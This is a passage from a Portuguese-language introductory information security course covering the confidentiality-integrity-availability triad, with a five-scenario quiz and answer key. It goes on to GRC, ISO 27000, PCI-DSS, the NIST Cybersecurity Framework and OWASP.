constante 3 pilares: Confidencialidade, Integridade e Disponibilidade, estes 
fundamentais para qualquer área de segurança da informação, formando a sigla 
CID.  
 
Memorize estes 3 pilares, eles serão seus melhores amigos na sua jornada 
profissional de segurança e base para qualquer política de segurança da 
informação: 
 

 
 
Figura 1.2: As três bases fundamentais de segurança da informação 
 
 
 
Vamos exercitar esses conceitos para ajudar a fixá-los em nossa memória. 
Trabalharemos com cinco cenários de incidentes ou ciberataques envolvendo 
violações de Confidencialidade, Integridade e Disponibilidade. O desafio aqui é 
entender qual violação foi feita (podendo ser uma ou mais) a partir dos cenários 
a seguir.  
 
Consegue descobrir?  
 
Ao 
final 
do 
exercício 
haverá 
um 
gabarito 
para 
conferência. 
 
Cenário 1 
 
Descrição: uma empresa de saúde sofreu um ataque de phishing direcionado a 
seus funcionários. Um dos funcionários caiu no golpe e acabou fornecendo suas 
credenciais de acesso ao sistema de registros eletrônicos de saúde. Os 
atacantes utilizaram essas credenciais para acessar e exfiltrar dados sensíveis 
de pacientes, incluindo dados PII (Personal Identifiable Information) e históricos 
médicos. 
Pergunta: que tipo de violação de segurança da informação ocorreu neste 
cenário? 
• 
a) Violação de integridade 
• 
b) Violação de disponibilidade 
• 
c) Violação de confidencialidade 
• 
d) Violação de autenticidade 
• 
e) Violação de não repúdio 
 
 
 

 
 
Cenário 2 
 
Descrição: um banco descobriu que um hacker conseguiu inserir um código 
malicioso em seu sistema de gerenciamento de transações. Esse código 
alterava os valores de certas transações, aumentando ou diminuindo os valores 
transferidos entre contas, sem o conhecimento dos usuários legítimos. 
Pergunta: que tipo de violação de segurança da informação ocorreu neste 
cenário? 
• 
a) Violação de integridade 
• 
b) Violação de disponibilidade 
• 
c) Violação de confidencialidade 
• 
d) Violação de autenticidade 
• 
e) Violação de não repúdio 
 
 
Cenário 3 
 
Descrição: uma empresa de comércio eletrônico sofreu um ataque DDoS 
(Distributed Denial of Service) durante a Black Friday. O ataque sobrecarregou 
seus servidores, tornando o site da empresa inacessível para os clientes durante 
várias horas, resultando em perda de receita (prejuízos financeiros) e de 
confiança dos clientes. 
Pergunta: que tipo de violação de segurança da informação ocorreu neste 
cenário? 
• 
a) Violação de integridade 
• 
b) Violação de confidencialidade 
• 
c) Violação de disponibilidade 
• 
d) Violação de autenticidade 
• 
e) Violação de não repúdio 
 
 
Cenário 4 
 
Descrição: uma empresa de software descobre que um atacante conseguiu 
comprometer o código-fonte de seu produto principal. Além de roubar o código-
fonte no repositório de códigos da empresa, o atacante inseriu vulnerabilidades 
ocultas no software, que poderiam ser exploradas posteriormente de maneira 
remota. 
Pergunta: que tipos de violação de segurança da informação ocorreram neste 
cenário? 
• 
a) Violação de integridade e autenticidade 
• 
b) Violação de confidencialidade e integridade 
• 
c) Violação de disponibilidade e não repúdio 
• 
d) Violação de autenticidade e disponibilidade 
• 
e) Violação de confidencialidade e disponibilidade 
 
 
Cenário 5: 
 
Descrição: um ransomware foi introduzido na rede de uma grande corporação. 
O ransomware criptografou todos os arquivos dos servidores e, além disso, os 

 
 
atacantes ameaçaram divulgar publicamente informações confidenciais caso o 
resgate não fosse pago. 
Pergunta: que tipos de violação de segurança da informação ocorreram neste 
cenário? 
• 
a) Violação de confidencialidade e não repúdio 
• 
b) Violação de disponibilidade e autenticidade 
• 
c) Violação de confidencialidade e disponibilidade 
• 
d) Violação de integridade e autenticidade 
• 
e) Violação de integridade e confidencialidade 
 
 
Esses cenários acima podem ajudar a ilustrar diferentes aspectos das violações 
de segurança da informação e a importância de cada um dos princípios 
fundamentais. 
 
 
 
Gabarito 
 
Cenário 1: c) Violação de confidencialidade 
Cenário 2: a) Violação de integridade 
Cenário 3: c) Violação de disponibilidade 
Cenário 4: b) Violação de confidencialidade e integridade 
Cenário 5: c) Violação de confidencialidade e disponibilidade  
 
 
 
Os princípios de segurança da informação formam a base sobre a qual as 
políticas e práticas de segurança de uma organização são construídas. Eles 
garantem que os dados e sistemas sejam protegidos de ameaças e que a 
organização possa operar de forma segura, eficiente e em conformidade com as 
normas aplicáveis. 
 
Lembre-se sempre: Confidencialidade, Integridade e Disponibilidade. 

 
 
 
UNIDADE 2 NORMAS E REGULAMENTAÇÕES 
 
Agora que você já conhece os princípios da área da segurança da informação, 
e tem memorizado o que é Confidencialidade, Integridade e Disponibilidade, 
podemos entender melhor como funciona uma governança de segurança da 
informação em uma companhia. Revise quantas vezes for necessário os 
termos apresentados, como diretrizes, normas, procedimentos e conformidade 
(ou compliance), pois esses termos serão muito utilizados daqui em diante, 
então é importante que esses conceitos e princípios estejam muito claros para 
conseguir se aprofundar mais. 
 
OBJETIVOS DA UNIDADE 2 
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Ter um entendimento mínimo de uma Governança de Segurança da 
Informação; 
 
• Ter compreensão sobre conformidade, conhecendo: 
 
o ISO 27000 e outras normas relevantes; 
o Regulamentações nacionais e internacionais. 
 
 
 

 
 
2.1. CONFORMIDADE E GOVERNANÇA 
 
A conformidade visa estar em sintonia com regras e políticas, sejam internas ou 
externas. De maneira geral, estar em conformidade com algo, é seguir as 
práticas deste modelo apresentado ou buscar estar com a maior aderência 
possível com esse modelo, visto que nem sempre o que for apresentado no 
modelo poderá ser seguido à risca, seja por conflito de interesses, leis, ou outras 
situações. 
A Governança de Segurança da Informação (GSI) direciona estratégias e 
programas de segurança corporativa, monitorando seu sucesso ou insucesso, 
para aumentar a maturidade de segurança da companhia ou reduzir riscos e 
custos associados. No Brasil, é comum as empresas terem áreas de 
Governança, Risco e Conformidade (GRC) para gerenciar esses três aspectos. 
 
O que é e o que faz uma área de GRC? 
 
GRC é a sigla para Governança, Riscos e Conformidade (ou Governance, Risk 
and Compliance, em inglês), e refere-se a um conjunto integrado de práticas, 
processos e frameworks que as organizações utilizam para gerenciar e alinhar 
suas atividades de negócios com os objetivos estratégicos, gerenciar riscos e 
garantir conformidade com regulamentos e normas aplicáveis. A área de GRC 
dentro de uma organização desempenha um papel crucial na proteção dos 
interesses da empresa, garantindo que ela opere de maneira eficiente, ética e 
em conformidade com a legislação. 
 
Componentes de uma área de GRC 
 
1. Governança – Governance 
 
O que é? A governança refere-se às estruturas, processos e práticas que as 
organizações utilizam para tomar decisões, definir estratégias e monitorar o 
desempenho. Envolve o estabelecimento de políticas e procedimentos que 
orientam a tomada de decisões e a forma como a organização atinge seus 
objetivos. 
 
Funções principais: a governança assegura que a liderança da empresa tome 
decisões alinhadas com os objetivos estratégicos, promove a transparência e a 
responsabilidade, e estabelece uma cultura organizacional que valorize a ética 
e a integridade. 
 
2. Gestão de Riscos – Risk Management 
 
O que é? A gestão de riscos envolve a identificação, avaliação e mitigação de 
riscos que possam afetar a capacidade da organização de atingir seus objetivos. 
Isso inclui riscos financeiros, operacionais, tecnológicos, de segurança, legais e 
de reputação. 
 
Funções principais: a gestão de riscos é responsável por desenvolver 
frameworks e processos para monitorar e mitigar os riscos identificados, 
assegurando que a empresa esteja preparada para enfrentar desafios 
imprevistos e minimizar impactos negativos. 

 
 
3. Conformidade – Compliance 
 
O que é? A conformidade garante que a empresa siga todas as leis, 
regulamentos, normas e políticas internas relevantes. Isso envolve aderir a 
requisitos legais e regulamentares, bem como a normas éticas e de conduta. 
 
Funções principais: a área de conformidade monitora e garante a adesão a todas 
as obrigações legais e regulamentares, promove a conformidade interna com 
políticas e procedimentos, e realiza treinamentos para assegurar que todos os 
funcionários entendam suas responsabilidades. 
 
Principais atividades de GRC 
 
Desenvolvimento de políticas e procedimentos: a área de GRC desenvolve e 
mantém políticas e procedimentos que regem como a organização deve operar, 
incluindo diretrizes para gestão de riscos, conformidade regulatória e práticas de 
governança. 
 
Gestão de Riscos: implementa processos para identificar e avaliar riscos em toda 
a organização, desenvolvendo planos para mitigar ou gerenciar esses riscos. 
Isso inclui a realização de análises de riscos regulares e a revisão contínua dos 
controles internos. 
 
Monitoramento da conformidade: monitora as operações da empresa para 
garantir que todas as atividades estejam em conformidade com as leis e 
regulamentos aplicáveis, bem como com as políticas internas. Isso pode incluir 
auditorias internas, revisões de conformidade e o acompanhamento de 
mudanças regulatórias. 
 
Relatórios e comunicação: garante que as informações sobre riscos, 
conformidade e governança sejam comunicadas de maneira eficaz à liderança 
da empresa e outras partes interessadas. Isso inclui a preparação de relatórios 
regulares para o conselho de administração e comitês executivos. 
 
Treinamento e conscientização: oferece treinamento contínuo para todos os 
funcionários sobre políticas de conformidade, gestão de riscos e práticas de 
governança, garantindo que todos estejam cientes de suas responsabilidades e 
saibam como agir em conformidade com as diretrizes estabelecidas. 
 
Auditorias e revisões: realiza auditorias internas e externas para verificar se os 
processos de governança, gestão de riscos e conformidade estão sendo 
seguidos corretamente. As auditorias ajudam a identificar áreas de melhoria e 
garantir que as operações da empresa estejam alinhadas com as melhores 
práticas. 
 
Obviamente não se resume a estas atividades, cada área e empresa pode ter 
uma particularidade, onde por exemplo, existem empresas onde áreas de 
conscientização (Security Awareness) e Gestão de Riscos são separadas, ou 
área de auditoria é uma vertical completamente independente. Mas em geral, 
essas são atividades comuns a GRC. 
 

 
 
Benefícios da efetividade do GRC 
 
• 
Redução de riscos: ao gerenciar ativamente os riscos, a área de GRC 
ajuda a reduzir a probabilidade e o impacto de eventos adversos que 
possam prejudicar a organização. 
• 
Conformidade com regulamentos: garante que a empresa esteja em 
conformidade com todas as leis e regulamentos aplicáveis, evitando 
multas, penalidades e danos à reputação. 
• 
Melhoria da governança corporativa: fortalece a governança corporativa 
ao promover a transparência, a responsabilidade e a integridade em todos 
os níveis da organização. 
• 
Apoio à tomada de decisões: fornece à liderança informações críticas 
sobre riscos e conformidade, apoiando a tomada de decisões informadas 
e alinhadas com os objetivos estratégicos da empresa. 
• 
Promoção de uma cultura de ética e segurança: fomenta uma cultura 
organizacional que valoriza a ética e a conformidade, o que pode levar a 
um ambiente de trabalho mais positivo e a um maior comprometimento 
dos funcionários. 
 
A área de GRC desempenha um papel vital na proteção e no crescimento 
sustentável das organizações, garantindo que elas operem de maneira eficiente, 
ética e em conformidade com as leis e regulamentos. Ao integrar governança, 
gestão de riscos e conformidade, as empresas podem enfrentar desafios 
complexos de maneira mais eficaz, proteger seus ativos e fortalecer sua posição 
competitiva no mercado. 
 
 
2.2. FAMÍLIA ISO 27000 E OUTRAS NORMAS RELEVANTES 
 
A ISO 27000 é parte de uma família de normas internacionais que estabelecem 
diretrizes para a gestão da segurança da informação em organizações de todos 
os tipos e tamanhos. A série de normas ISO/IEC 27000 foi desenvolvida pela 
Organização Internacional de Normalização (ISO) em colaboração com a 
Comissão Eletrotécnica Internacional (IEC), e é amplamente reconhecida como 
o padrão global para Sistemas de Gestão de Segurança da Informação (SGSI). 
 
A série ISO 27000 abrange uma variedade de normas que fornecem uma 
estrutura abrangente para a gestão de segurança da informação. O foco principal 
da série é a ISO/IEC 27001, que especifica os requisitos para estabelecer, 
implementar, manter e melhorar continuamente um SGSI. Este sistema é 
projetado para proteger as informações sensíveis de uma organização, 
garantindo sua confidencialidade, integridade e disponibilidade. 
 
Importância da ISO 27000 na Segurança da Informação 
 
1. Estabelecimento de Padrões Globais 
 
A ISO 27000 fornece um padrão reconhecido internacionalmente para a gestão 
da segurança da informação. Ao adotar a ISO/IEC 27001, as organizações 
demonstram seu compromisso com a proteção de informações sensíveis, o que 
pode aumentar a confiança de clientes, parceiros e outras partes interessadas. 

 
 
 
2. Gestão Eficiente de Riscos 
 
A implementação de um SGSI baseado na ISO 27000 ajuda as organizações a 
identificar, avaliar e mitigar riscos de segurança da informação de maneira 
estruturada e eficaz. Isso permite que as empresas minimizem a probabilidade 
de incidentes de segurança e reduzam o impacto de quaisquer violações que 
possam ocorrer. 
 
3. Conformidade com Regulamentações 
 
Em muitos setores, a conformidade com a ISO 27000 é um requisito para atender 
às regulamentações de segurança da informação. Organizações que aderem a 
esses padrões podem evitar penalidades legais e melhorar sua posição 
competitiva no mercado. Além disso, a conformidade com a ISO 27001 pode 
facilitar o cumprimento de outras normas e leis, como a GDPR na União Europeia 
e a LGPD no Brasil. 
 
4. Melhoria Contínua 
 
Um dos princípios fundamentais da ISO 27000 é a melhoria contínua. As 
organizações são incentivadas a revisar e melhorar regularmente suas políticas 
e controles de segurança da informação, garantindo que estejam sempre 
atualizadas e eficazes diante de novas ameaças e mudanças tecnológicas. 
 
5. Redução de Custos 
 
A gestão proativa da segurança da informação, conforme orientada pela ISO 
27000, pode resultar em uma redução significativa de custos associados a 
incidentes de segurança. Ao prevenir violações de dados e interrupções nos 
negócios, as empresas podem evitar os custos elevados de recuperação, multas 
e danos à reputação. 
 
6. Reputação e Credibilidade 
 
A certificação ISO/IEC 27001 pode servir como um diferencial competitivo para 
as organizações, mostrando ao mercado que a empresa segue as melhores 
práticas de segurança da informação. Isso pode aumentar a confiança de 
clientes e parceiros de negócios, facilitando a obtenção de novos contratos e a 
manutenção de relacionamentos comerciais existentes. 
 
Exemplos de implementação da ISO 27000 
 
Setor financeiro: bancos e instituições financeiras frequentemente adotam a 
ISO 27001 para proteger dados sensíveis de clientes e transações financeiras. 
A conformidade com essa norma é fundamental para manter a confiança dos 
clientes e cumprir as regulamentações do setor. 
 
Empresas de tecnologia: empresas que operam em ambientes de 
computação em nuvem, como provedores de serviços de nuvem, utilizam a 
ISO/IEC 27017 e ISO/IEC 27018 para garantir que os dados de seus clientes 

 
 
estejam protegidos contra acessos não autorizados e sejam tratados de acordo 
com as melhores práticas internacionais. 
 
Saúde: hospitais e organizações de saúde adotam a ISO 27001 para garantir a 
segurança das informações dos pacientes e o cumprimento das leis de 
privacidade, como a HIPAA nos Estados Unidos e a LGPD no Brasil. 
 
 
 
A ISO 27000 desempenha um papel crucial na proteção das informações de uma 
organização contra uma ampla gama de ameaças. Ao implementar um SGSI 
baseado na ISO 27001 e nas demais normas da série, as empresas podem 
gerenciar seus riscos de segurança de maneira eficaz, garantir a conformidade 
com regulamentações importantes e demonstrar seu compromisso com a 
segurança da informação. A adoção da ISO 27000 não apenas fortalece a 
resiliência da organização, mas também aumenta sua credibilidade no mercado 
global, promovendo uma cultura de segurança que beneficia todas as partes 
interessadas. 
 
Família ISO 27000 
 
A família ISO 27000 é focada em padrões de segurança da informação, 
fornecendo diretrizes e boas práticas para gestão de segurança. Entre as 
normas, destacam-se: 
 
ISO/IEC 27001: estabelece, implementa, opera, monitora, revisa e melhora um 
Sistema de Gestão de Segurança da Informação (SGSI).  
 
Referência: https://www.iso.org/standard/27001 
 
ISO/IEC 27002: fornece diretrizes para selecionar, implementar e gerenciar 
controles de segurança da informação. 
 
Referência: https://www.iso.org/standard/75652.html 
 
ISO/IEC 27005: oferece diretrizes para a gestão de riscos relacionados à 
segurança da informação. 
 
Referência: https://www.iso.org/standard/80585.html 
 
ISO/IEC 27017: diretrizes específicas para a segurança da informação em 
ambientes de computação em nuvem. 
 
Referência: https://www.iso.org/standard/43757.html 
 
ISO/IEC 27018: diretrizes para a proteção de dados pessoais em ambientes de 
nuvem. 
 
Referência: https://www.iso.org/standard/76559.html 
 
 

 
 
Payment Card Industry Data Security Standard 
 
A norma PCI-DSS (Payment Card Industry Data Security Standard) é um 
conjunto de padrões de segurança desenvolvido para proteger as informações 
de cartões de pagamento contra fraudes e outras ameaças cibernéticas. Esses 
padrões são mantidos pelo PCI Security Standards Council, uma entidade 
formada pelas principais bandeiras de cartões de crédito, como Visa, 
MasterCard, American Express, Discover e JCB. A conformidade com o PCI-
DSS é obrigatória para todas as organizações que processam, armazenam ou 
transmitem dados de cartões de pagamento, independentemente de seu 
tamanho ou volume de transações. 
 
PCI-DSS em detalhes 
 
O PCI-DSS foi criado para assegurar que todas as organizações que lidam com 
informações de cartões de crédito mantenham um ambiente de segurança 
robusto. A norma inclui um conjunto de 12 requisitos fundamentais, que são 
organizados em seis categorias principais: 
 
1. Construir e manter uma rede segura 
 
• Requisito 1: instalar e manter uma configuração de firewall para proteger 
os dados dos titulares de cartão. 
• Requisito 2: não usar senhas padrão fornecidas por fabricantes de 
sistemas e outros parâmetros de segurança padrão. 
 
2. Proteger os dados dos titulares de cartão 
 
• Requisito 3: proteger os dados armazenados dos titulares de cartão. 
• Requisito 4: criptografar a transmissão dos dados dos titulares de cartão 
através de redes públicas abertas. 
 
3. Manter um programa de gestão de vulnerabilidades 
• Requisito 5: usar e atualizar regularmente software de antivírus ou 
antimalware. 
• Requisito 6: desenvolver e manter sistemas e aplicativos seguros. 
 
 
4. Implementar medidas rígidas de controle de acesso 
• Requisito 7: restringir o acesso aos dados dos titulares de cartão, 
somente para aqueles que precisam conhecer essas informações. 
• Requisito 8: atribuir uma ID única para cada pessoa com acesso ao 
sistema de computadores. 
 
• Requisito 9: restringir o acesso físico aos dados dos titulares de cartão. 
 
5. Monitorar e testar redes regularmente 
• Requisito 10: monitorar e rastrear todos os acessos aos recursos de rede 
e aos dados dos titulares de cartão. 
 
• Requisito 11: testar regularmente sistemas e processos de segurança. 
 
6. Manter uma política de segurança da informação 

 
 
• Requisito 12: manter uma política que trate da segurança da informação 
para todos os funcionários. 
 
Importância do PCI-DSS na Segurança da Informação 
 
1. Proteção contra fraudes 
 
O PCI-DSS desempenha um papel crucial na prevenção de fraudes relacionadas 
a cartões de pagamento. A implementação dos controles especificados na 
norma ajuda a proteger os dados dos titulares de cartões contra acessos não 
autorizados, evitando fraudes que podem resultar em perdas financeiras 
significativas para empresas e consumidores. 
 
2. Mitigação de riscos de segurança 
 
A conformidade com a PCI-DSS ajuda as organizações a identificar e mitigar 
riscos associados ao manuseio de informações sensíveis de pagamento. Isso 
inclui a proteção contra ataques cibernéticos, vazamentos de dados e outras 
ameaças que poderiam comprometer a integridade dos dados dos clientes. 
 
3. Cumprimento de regulamentações 
 
A não conformidade com a PCI-DSS pode resultar em multas severas, custos 
elevados de recuperação em caso de incidentes e a possível perda da 
capacidade de processar pagamentos com cartões de crédito. Além disso, a 
conformidade é um requisito legal em muitos países, o que torna a adesão à 
norma uma obrigação para as organizações que desejam operar de forma legal 
e segura. 
 
4. Confiança do cliente 
 
A conformidade com a PCI-DSS demonstra um compromisso sério com a 
proteção dos dados dos clientes, aumentando a confiança dos consumidores na 
empresa. Isso pode ser um diferencial competitivo, especialmente em um 
mercado onde a privacidade e a segurança dos dados são preocupações 
crescentes. 
 
5. Redução de custos associados a incidentes 
 
A implementação eficaz das diretrizes da PCI-DSS pode ajudar a reduzir os 
custos associados a incidentes de segurança, como violações de dados. Esses 
custos incluem não apenas as multas, mas também a perda de reputação, a 
compensação para os consumidores afetados e as despesas legais. 
 
 
6. Padronização de práticas de segurança 
 
A PCI-DSS fornece uma estrutura padronizada para a proteção de dados de 
pagamento, que pode ser implementada globalmente, independentemente do 
tamanho ou da localização da organização. Isso facilita a gestão de segurança 
da informação, especialmente para empresas que operam em múltiplas regiões 
ou que lidam com parceiros internacionais. 

 
 
 
Exemplos de Implementação da PCI-DSS 
 
Comércio eletrônico: 
 
Cenário: uma loja online que processa pagamentos com cartões de crédito 
implementa os requisitos da PCI-DSS para garantir que todas as transações 
sejam seguras. 
 
Implementação: a empresa criptografa os dados dos cartões durante a 
transmissão e armazena informações sensíveis em servidores seguros, 
acessíveis apenas por pessoal autorizado. Além disso, realiza auditorias 
regulares para garantir que os sistemas de segurança estejam atualizados e em 
conformidade com os padrões. 
 
Instituições financeiras: 
 
Cenário: um banco adota a PCI-DSS para proteger as informações dos cartões 
de crédito de seus clientes e garantir a conformidade com regulamentos 
financeiros. 
 
Implementação: o banco instala firewalls robustos, utiliza autenticação 
multifatorial para acessar sistemas críticos e monitora constantemente o acesso 
aos dados dos titulares de cartões para detectar e prevenir atividades suspeitas. 
 
Serviços de pagamento: 
 
Cenário: um provedor de serviços de pagamento, que processa milhões de 
transações por mês, implementa a PCI-DSS para proteger os dados dos clientes 
e cumprir os requisitos das bandeiras de cartões. 
 
Implementação: a empresa adota práticas de desenvolvimento seguro para 
todos os seus sistemas de software, realiza testes de penetração regularmente 
e mantém um programa de gestão de vulnerabilidades para identificar e corrigir 
rapidamente quaisquer fraquezas em seus sistemas. 
 
 
 
Para concluir, a norma PCI-DSS é fundamental para a segurança das 
informações de pagamento em todo o mundo. Ao estabelecer requisitos 
rigorosos para a proteção dos dados dos titulares de cartões, a PCI-DSS ajuda 
as organizações a mitigar riscos, evitar fraudes e garantir a conformidade com 
regulamentações internacionais. 
 
Referência: 
https://en.wikipedia.org/wiki/Payment_Card_Industry_Security_Standards_Cou
ncil 
 
 
 
 

 
 
 
 
 
National Institute of Standards and Technology 
 
 
O NIST Cybersecurity Framework é um conjunto de diretrizes desenvolvido pelo 
Instituto Nacional de Padrões e Tecnologia (NIST – Nacional Institute of 
Standards and Technology) dos Estados Unidos para ajudar as organizações a 
gerenciar e reduzir os riscos de segurança cibernética. Criado inicialmente em 
2014, o framework tem sido amplamente adotado por organizações de todos os 
tamanhos e setores ao redor do mundo devido à sua flexibilidade, abrangência 
e eficácia em melhorar a segurança da informação. 
 
NIST Cybersecurity Framework em detalhes 
 
O NIST Cybersecurity Framework é estruturado em torno de cinco funções 
principais que formam o núcleo do gerenciamento de riscos de segurança 
cibernética. Essas funções são desenhadas para criar uma abordagem holística 
e iterativa para a segurança, permitindo que as organizações desenvolvam, 
implementem e melhorem continuamente suas estratégias de proteção 
cibernética. 
 
As cinco funções principais (destaco o termo original em inglês seguido de sua 
tradução) do framework são: 
 
1. Identify – Identificar: 
 
O que é? Esta função envolve o desenvolvimento de uma compreensão 
organizacional para gerenciar os riscos de segurança cibernética aos sistemas, 
pessoas, ativos, dados e capacidades. A função “Identify” ajuda as organizações 
a entenderem o contexto e os recursos que suportam as funções críticas, bem 
como os riscos associados. 
 
Componentes-chave: gestão de ativos, governança, avaliação de riscos, gestão 
de fornecedores e compreensão dos impactos nos negócios. 
 
 
2. Protect – Proteger: 
 
O que é? A função “Protect” foca em implementar as salvaguardas necessárias 
para garantir a entrega de serviços críticos e limitar ou conter o impacto de 
potenciais eventos cibernéticos. 
 
Componentes-chave: controle de acesso, segurança de dados, proteção contra 
ameaças, manutenção de processos e procedimentos, e conscientização e 
treinamento em segurança. 
 
 
3. Detect – Detectar: 
 
O que é? Esta função envolve a implementação de atividades para identificar a 
ocorrência de um evento de segurança cibernética. A função “Detect” garante 

 
 
que as ameaças sejam identificadas prontamente para que possam ser 
abordadas antes de causar danos significativos. 
 
Componentes-chave: monitoramento contínuo, detecção de anomalias e 
eventos, e gestão de segurança contínua. 
 
4. Respond – Responder 
 
O que é? A função “Respond” inclui atividades apropriadas para tomar medidas 
diante de um incidente de segurança cibernética detectado, minimizando seu 
impacto. 
 
Componentes-chave: planejamento de resposta, comunicação, análise, 
mitigação e melhorias. 
 
 
5. Recover – Recuperar 
 
O que é? A função “Recover” abrange atividades para restaurar quaisquer 
serviços que foram interrompidos por um incidente de segurança cibernética. A 
recuperação também envolve ações para restaurar a capacidade operacional 
normal e minimizar o impacto do incidente. 
 
Componentes-chave: planejamento de recuperação, melhorias e comunicação. 
 
 
Importância do NIST Cybersecurity Framework na Segurança da Informação 
 
1. Estrutura flexível e personalizável 
 
O NIST Cybersecurity Framework é projetado para ser flexível e adaptável, 
permitindo que organizações de diferentes tamanhos, setores e regiões 
personalizem as diretrizes de acordo com suas necessidades específicas. Essa 
flexibilidade torna o framework acessível a uma ampla gama de organizações, 
desde pequenas empresas até grandes corporações multinacionais. 
 
 
2. Gestão abrangente de riscos 
 
Ao abordar a segurança cibernética de forma holística, o NIST Framework 
permite que as organizações gerenciem riscos em toda a sua infraestrutura 
digital. Ele fornece uma estrutura clara para identificar riscos, implementar 
controles de proteção, monitorar ameaças, responder a incidentes e recuperar-
se de interrupções. Isso resulta em uma abordagem mais robusta e integrada 
para a gestão de riscos cibernéticos. 
 
3. Melhoria contínua 
 
Um dos principais benefícios do NIST Cybersecurity Framework é seu foco na 
melhoria contínua. As organizações são incentivadas a revisar e atualizar 
regularmente suas práticas de segurança cibernética, garantindo que estejam 
sempre preparadas para enfrentar novas ameaças e desafios. Este ciclo 

 
 
contínuo de aprimoramento ajuda as empresas a se manterem à frente das 
ameaças em constante evolução. 
 
 
4. Conformidade e Governança 
Embora o NIST Framework não seja um requisito legal em si, ele está alinhado 
com muitos requisitos regulatórios e de conformidade em várias indústrias. 
Adotar o framework pode ajudar as organizações a cumprir outras normas e 
regulamentações, como a Lei de Portabilidade e Responsabilidade de Seguro 
de Saúde (HIPAA) nos Estados Unidos ou a Lei Geral de Proteção de Dados 
(LGPD) no Brasil. 
 
5. Fortalecimento da resiliência organizacional 
 
Implementar o NIST Cybersecurity Framework fortalece a resiliência 
organizacional contra ataques cibernéticos. Ao preparar e equipar a organização 
para detectar e responder rapidamente a incidentes, o framework reduz o 
impacto de ataques cibernéticos e facilita uma recuperação rápida e eficaz, 
minimizando interrupções nos negócios. 
 
6. Promoção de cultura de segurança 
 
O framework enfatiza a importância da conscientização e do treinamento em 
segurança cibernética, ajudando a criar uma cultura organizacional que prioriza 
a segurança da informação. Isso é crucial em um ambiente onde os funcionários 
estão frequentemente na linha de frente da defesa contra ameaças cibernéticas. 
 
Exemplos de Implementação do NIST Cybersecurity Framework 
 
Indústrias de infraestrutura crítica 
 
Cenário: uma empresa de energia implementa o NIST Cybersecurity Framework 
para proteger sua infraestrutura crítica contra ataques cibernéticos que poderiam 
interromper o fornecimento de energia. 
 
Implementação: a empresa realiza uma avaliação abrangente de riscos, 
implementa controles de proteção avançados, estabelece procedimentos para 
monitoramento contínuo de ameaças e desenvolve planos de resposta a 
incidentes e recuperação para garantir a continuidade do serviço em caso de 
ataque. 
 
Setor financeiro 
 
Cenário: um banco adota o NIST Framework para gerenciar os riscos associados 
a transações financeiras digitais e proteger dados sensíveis de clientes. 
 
Implementação: O banco utiliza o framework para identificar vulnerabilidades em 
seus sistemas, fortalecer a proteção de dados, implementar monitoramento em 
tempo real para detectar atividades suspeitas e desenvolver planos de resposta 
e recuperação de incidentes. 
 
Empresas de Tecnologia 

 
 
 
Cenário: uma empresa de software adota o NIST Cybersecurity Framework para 
proteger seu ambiente de desenvolvimento e seus produtos contra ameaças 
cibernéticas. 
 
Implementação: a empresa incorpora o framework em seus processos de 
desenvolvimento seguro, realiza testes regulares de penetração, monitora 
continuamente a segurança de seus produtos afim de evitar ataques. 
 
 
 
Sumarizando tudo o que foi colocado aqui sobre o framework, o NIST fornece 
normas e diretrizes para segurança, com destaque para o NIST CyberSecurity 
Framework, que gerencia e reduz riscos cibernéticos. Ele inclui identificação, 
proteção, detecção, resposta e recuperação de incidentes de segurança. O NIST 
CyberSecurity Framework é mantido pelo governo dos Estados Unidos da 
America. 
 
Referência: https://en.wikipedia.org/wiki/NIST_Cybersecurity_Framework 
 
 
 
 
Open Worldwide Application Security Project 
 
A Open Web Application Security Project (OWASP) é uma organização sem fins 
lucrativos que se dedica a melhorar a segurança de software. Por meio de uma 
série de recursos, ferramentas e boas práticas, o OWASP influencia 
significativamente as políticas de segurança da informação, especialmente no 
que diz respeito ao desenvolvimento seguro de aplicações. As diretrizes e 
ferramentas oferecidas pelo OWASP são amplamente reconhecidas e adotadas 
por desenvolvedores e organizações em todo o mundo, ajudando a proteger 
aplicações contra vulnerabilidades e ameaças comuns. 
 
O OWASP é uma organização global que fornece recursos abertos para ajudar 
as empresas a criar e manter software seguro. Um dos produtos mais 
conhecidos do OWASP é o OWASP Top 10, uma lista das dez vulnerabilidades 
de segurança mais críticas em aplicações web. Além do OWASP Top 10, a 
organização oferece uma série de outras ferramentas e projetos que influenciam 
diretamente as práticas de desenvolvimento seguro, como o OWASP ASVS 
(Application Security Verification Standard) e o OWASP SAMM (Software 
Assurance Maturity Model). 
 
A OWASP melhora a segurança de aplicações, fornecendo frameworks, normas, 
guias e ferramentas gratuitas para minimizar ameaças de segurança durante o 
desenvolvimento de software. O foco da OWASP é dar guias de boas práticas 
de desenvolvimento seguro, bem como mostrar potenciais ameaças através de 
seu Top 10 para aplicações web, mobile, APIs, entre outros. Não restrito a estes 
temas, a OWASP fornece dicas de segurança para diversas questões de 
segurança na camada de aplicação do modelo OSI. 
Influência do OWASP em políticas de segurança da informação 

 
 
 
1. OWASP Top 10: Base para políticas de desenvolvimento seguro 
 
O que é? O OWASP Top 10 é uma lista atualizada periodicamente que identifica 
as vulnerabilidades de segurança mais críticas em aplicações web. Ele serve 
como um ponto de partida para desenvolvedores e organizações ao criar 
políticas de segurança para o desenvolvimento de software. 
 
Como influencia? 
 
• Definição de Requisitos de Segurança: as políticas de segurança de 
desenvolvimento frequentemente incorporam as recomendações do 
OWASP Top 10, exigindo que os desenvolvedores implementem 
controles específicos para mitigar essas vulnerabilidades. Exemplos 
incluem a prevenção contra injeção de SQL, a gestão de autenticação e 
sessões, e a validação adequada de entradas de usuários. 
 
• Treinamento de Desenvolvedores: o OWASP Top 10 é amplamente 
utilizado como um recurso educacional para treinar desenvolvedores 
sobre as ameaças mais comuns e como evitá-las. Isso garante que a 
equipe de desenvolvimento esteja ciente das melhores práticas de 
segurança desde o início do ciclo de desenvolvimento. 
 
2. OWASP ASVS: Verificação e Validação de Segurança 
 
O que é? O OWASP Application Security Verification Standard (ASVS) é um 
framework detalhado que fornece um conjunto de requisitos de segurança para 
validar a segurança das aplicações. Ele é utilizado para garantir que o software 
esteja protegido contra uma ampla gama de ameaças. 
 
Como influencia? 
 
• Criação de Normas e Padrões: as políticas de segurança da informação 
muitas vezes adotam o OWASP ASVS como um padrão para a verificação 
de segurança de software. Isso significa que as aplicações devem passar 
por verificações de segurança em diferentes níveis (básico, padronizado 
e avançado) para garantir que atendam a requisitos específicos de 
segurança. 
• Avaliação e Auditoria de Segurança: o ASVS pode ser integrado às 
políticas de segurança para servir como uma base para auditorias de 
segurança de software, ajudando a identificar lacunas e áreas de melhoria 
